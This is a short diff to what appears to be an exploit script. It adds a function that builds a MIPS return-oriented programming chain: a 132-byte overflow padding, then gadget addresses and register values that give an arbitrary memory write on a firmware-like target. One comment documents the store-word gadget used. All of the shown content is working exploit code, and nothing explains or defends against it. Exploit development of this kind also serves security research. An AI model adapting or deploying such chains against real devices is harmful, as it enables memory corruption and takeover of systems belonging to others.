@@ -575,3 +575,21 @@ def rop_arbitrary_write(addr, value):
     chain += p32(0x801888e8) # ra
 
     return chain
+
+def rop_arbitrary_write_0_in_addr(addr, value):
+    chain = b'a' * 132
+
+    # Add the strings to the sX registers, and set the ra to first gadget
+    chain += p32(value) # s0
+    chain += p32(addr - 0x10) # s1
+    chain += p32(0x802C5268) # s2
+    chain += p32(0x802ab9f4) # s3
+    chain += p32(0x8018c2bc) # ra
+
+    # 0x8018c2bc: sw $s0, 0x10($s1); lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
+    chain += b'b' * 4
+    chain += p32(0x802c0404) # s0
+    chain += p32(0x8025d504) # s1
+    chain += p32(0x801888e8) # ra
+
+    return chain
